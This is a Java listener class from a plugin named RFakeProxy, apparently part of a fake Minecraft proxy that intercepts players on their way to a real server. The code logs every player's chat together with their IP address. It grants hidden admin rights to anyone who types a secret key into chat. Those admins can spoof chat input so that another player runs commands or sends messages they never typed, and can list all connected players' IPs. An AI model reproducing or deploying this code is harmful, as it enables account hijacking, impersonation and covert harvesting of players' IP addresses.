package dev.wrrulos.rFakeProxy.listeners;

import com.velocitypowered.api.event.Subscribe;
import com.velocitypowered.api.event.player.PlayerChatEvent;
import com.velocitypowered.api.proxy.Player;
import com.velocitypowered.api.proxy.ProxyServer;
import dev.wrrulos.rFakeProxy.RFakeProxy;
import dev.wrrulos.rFakeProxy.utils.MessageUtil;
import org.slf4j.Logger;
import org.spongepowered.configurate.ConfigurationNode;

import java.util.Collection;

public class ChatListener {
    private final ProxyServer server;
    private final Logger logger;
    private final RFakeProxy plugin;

    /**
     * Constructor for the ProxyPing class
     * @param server The proxy server
     * @param logger The logger
     * @param plugin The plugin
     */
    public ChatListener(ProxyServer server, Logger logger, RFakeProxy plugin) {
        this.server = server;
        this.logger = logger;
        this.plugin = plugin;
    }

    /**
     * Constructor for the onPlayerChat class
     * @param event The PlayerChatEvent
     */
    @Subscribe
    public void onPlayerChat(PlayerChatEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getUsername();
        String playerIP = player.getRemoteAddress().getAddress().getHostAddress();
        String message = event.getMessage();
        ConfigurationNode config = plugin.getConfig();

        if (message.equals(RFakeProxy.getAdminKey())) {
            if (RFakeProxy.getAdmins().contains(playerName)) {
                player.sendMessage(MessageUtil.createMessage("<dark_gray>[<light_purple>#<dark_gray>] <red>You are already an admin!"));
                event.setResult(PlayerChatEvent.ChatResult.denied());
                return;
            }

            RFakeProxy.addAdmin(playerName);
            player.sendMessage(MessageUtil.createMessage("<dark_gray>[<light_purple>#<dark_gray>] <green>Admin key accepted!"));
            System.out.println("[RFakeProxy] " + "[ADMIN] " + playerName + " " + playerIP);
            event.setResult(PlayerChatEvent.ChatResult.denied());
            return;
        }

        System.out.println("[RFakeProxy] " + "[CHAT] " + playerName + " " + playerIP + " " + message);
        // Check if the message starts with the prefix
        if (!message.startsWith(config.node("commandPrefix").getString("#"))) return;
        // If the message starts with the prefix but the player is not an admin, return
        if (!RFakeProxy.getAdmins().contains(playerName)) return;
        String[] commandParts = event.getMessage().split(" ");
        String command = commandParts[0].substring(1);

        if (command.equals("send")) {
            if (commandParts.length < 3) {
                player.sendMessage(MessageUtil.createMessage("<dark_gray>[<light_purple>#<dark_gray>] <red>Usage: send <player> <message/command>"));
                event.setResult(PlayerChatEvent.ChatResult.denied());
                return;
            }

            String playerNameToExecute = commandParts[1];
            String[] commandToExecuteArray = new String[commandParts.length - 2];
            System.arraycopy(commandParts, 2, commandToExecuteArray, 0, commandParts.length - 2);
            String commandToExecute = String.join(" ", commandToExecuteArray);
            Player targetPlayer = this.server.getPlayer(playerNameToExecute).orElse(null);

            if (targetPlayer == null) {
                player.sendMessage(MessageUtil.createMessage("<dark_gray>[<light_purple>#<dark_gray>] <red>Player not found"));
                event.setResult(PlayerChatEvent.ChatResult.denied());
                return;
            }

            targetPlayer.spoofChatInput(commandToExecute);
            System.out.println("[RFakeProxy] " + "[SEND] " + playerName + " " + playerIP + " " + playerNameToExecute + " " + commandToExecute);
        }

        if (command.equals("list")) {
            Collection<Player> players = this.server.getAllPlayers();
            player.sendMessage(MessageUtil.createMessage("<dark_gray><bold>----------------------"));
            for (Player p : players) {
                String pName = p.getUsername();
                String pIP = p.getRemoteAddress().getAddress().getHostAddress();
                String pClient = p.getProtocolVersion().getVersionIntroducedIn();
                player.sendMessage(MessageUtil.createMessage("<white>" + pName + "<green> " + pIP + "<white> " + pClient));
            }
            player.sendMessage(MessageUtil.createMessage("<dark_gray><bold>----------------------"));
        }

        if (command.equals("help")) {
            player.sendMessage(MessageUtil.createMessage("<dark_gray><bold>----------------------"));
            player.sendMessage(MessageUtil.createMessage("<white>#<green> send <player> <message/command>"));
            player.sendMessage(MessageUtil.createMessage("<white>#<green> list"));
            player.sendMessage(MessageUtil.createMessage("<white>#<green> help"));
            player.sendMessage(MessageUtil.createMessage("<dark_gray><bold>----------------------"));
        }

        event.setResult(PlayerChatEvent.ChatResult.denied());
    }
}
